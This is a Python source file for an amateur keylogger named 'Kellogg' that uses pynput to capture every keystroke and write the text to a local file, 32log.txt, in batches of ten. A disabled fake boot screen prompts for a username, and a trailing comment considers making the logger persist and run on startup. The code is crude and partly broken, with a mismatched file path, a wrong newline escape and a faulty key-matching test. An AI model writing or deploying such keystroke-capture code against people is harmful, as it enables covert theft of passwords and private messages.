#imports
import datetime
from pynput.keyboard import Key, Listener
import time
import os
import os.path
import shutil
import sys
#sys.path.insert(1, '')
'''
#UI break 1
os.system('color 6')
print("New Session Started")
time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')


#UI break 2
os.system('color 4')
Uname = input("INPUT USERNAME: ")
print("Kellogg Boot")
time.sleep(1)
print("Initializing Kellog")
time.sleep(1)

#UI break 3
os.system('cls' if os.name == 'nt' else 'clear')
now = datetime.datetime.now()
os.system('color 2')
print (str(now))
print("Welcome User:", Uname)
time.sleep(1)
print("UPDATE:")
print("____________________")

'''
#code acutal
count = 0
keys = []

if not os.path.exists("kellogg/32log.txt"):
    	f= open("32log.txt","w+")

    
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

#writing the file into a txt document
def write_file(keys):
    with open("32log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") >0:
                f.write("Screenshot")
                f.write('/n')
            elif k.find("backspace") >0:
                f.write("")
            elif k.find("alt") >0:
                f.write("Alt")
            elif k.find("<173>" or "<174>" or "<175>") > 0:
                f.write("Audio Change")
                
def on_release(key):     
    if key == Key.esc:
        return False
    #if we want we could try to make this save the txt file then run an inf. loop
    #then make it always begin start on run

with Listener(on_press=on_press, on_release=on_release)as listener:
    listener.join()
